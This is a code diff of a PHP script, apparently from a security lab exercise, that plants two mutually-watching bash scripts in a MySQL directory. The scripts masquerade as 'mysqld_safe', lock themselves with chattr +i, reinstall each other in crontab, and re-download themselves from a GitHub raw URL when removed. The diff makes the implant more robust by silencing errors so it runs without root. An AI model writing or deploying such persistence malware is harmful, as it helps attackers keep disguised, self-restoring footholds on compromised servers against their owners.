@@ -10,7 +10,6 @@ $pathA     = $mysqlDir . '/mysqld_' . bin2hex(random_bytes(3)) . '.sh';
 $pathB     = $mysqlDir . '/mysqld_' . bin2hex(random_bytes(3)) . '.sh';
 $logPath   = $mysqlDir . '/mysql_err.log';
 $gitRawUrl = 'https://raw.githubusercontent.com/dimasoko/lab3sec/refs/heads/main/script.sh';
-
 $scriptA = [
     '#!/bin/bash',
     '[[ "$1" != "daemon" ]] && exec -a "mysqld_safe" "$0" daemon',
@@ -19,17 +18,15 @@ $scriptA = [
     "LOG='"  . $logPath . "'",
     "GIT='"  . $gitRawUrl . "'",
     '',
-    '# проверка себя',
     'COUNT=$(crontab -l 2>/dev/null | grep -c "$SELF" || echo 0)',
     'if [ "$COUNT" -lt 1 ]; then',
-    '    chattr -i "$SELF"',
+    '    chattr -i "$SELF" 2>/dev/null',
     '    curl -s "$GIT" -o "$SELF"',
     '    chmod 755 "$SELF"',
-    '    chattr +i "$SELF"',
+    '    chattr +i "$SELF" 2>/dev/null',
     '    (crontab -l 2>/dev/null; echo "*/5 * * * * $SELF") | crontab -',
     'fi',
     '',
-    '# следим за B',
     'PEER_COUNT=$(crontab -l 2>/dev/null | grep -c "$PEER" || echo 0)',
     'if [ "$PEER_COUNT" -lt 1 ]; then',
     '    (crontab -l 2>/dev/null; echo "*/7 * * * * $PEER") | crontab -',
@@ -47,17 +44,15 @@ $scriptB = [
     "LOG='"  . $logPath . "'",
     "GIT='"  . $gitRawUrl . "'",
     '',
-    '# проверка себя',
     'COUNT=$(crontab -l 2>/dev/null | grep -c "$SELF" || echo 0)',
     'if [ "$COUNT" -lt 1 ]; then',
-    '    chattr -i "$SELF"',
+    '    chattr -i "$SELF" 2>/dev/null',
     '    curl -s "$GIT" -o "$SELF"',
     '    chmod 755 "$SELF"',
-    '    chattr +i "$SELF"',
+    '    chattr +i "$SELF" 2>/dev/null',
     '    (crontab -l 2>/dev/null; echo "*/7 * * * * $SELF") | crontab -',
     'fi',
     '',
-    '# следим за A',
     'PEER_COUNT=$(crontab -l 2>/dev/null | grep -c "$PEER" || echo 0)',
     'if [ "$PEER_COUNT" -lt 1 ]; then',
     '    (crontab -l 2>/dev/null; echo "*/5 * * * * $PEER") | crontab -',
@@ -72,23 +67,17 @@ file_put_contents($pathB, implode("\n", $scriptB));
 chmod($pathA, 0755);
 chmod($pathB, 0755);
 
-exec("chattr +i " . escapeshellarg($pathA));
-exec("chattr +i " . escapeshellarg($pathB));
+// chattr: подавляем вывод ошибки если нет root
+exec("chattr +i " . escapeshellarg($pathA) . " 2>/dev/null");
+exec("chattr +i " . escapeshellarg($pathB) . " 2>/dev/null");
 
 $existingCron = shell_exec("crontab -l 2>/dev/null") ?? '';
 
-$newCron = $existingCron;
 if (strpos($existingCron, $pathA) === false) {
-    $newCron .= "\n*/5 * * * * " . $pathA . "\n";
+    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg("*/5 * * * * $pathA") . ") | crontab -");
 }
 if (strpos($existingCron, $pathB) === false) {
-    $newCron .= "\n*/7 * * * * " . $pathB . "\n";
-}
-
-if ($newCron !== $existingCron) {
-    file_put_contents('/tmp/_ctab', $newCron);
-    exec("crontab /tmp/_ctab");
-    unlink('/tmp/_ctab');
+    exec("(crontab -l 2>/dev/null; echo " . escapeshellarg("*/7 * * * * $pathB") . ") | crontab -");
 }
 
 echo "Скрипты созданы: {$pathA}, {$pathB}\n";
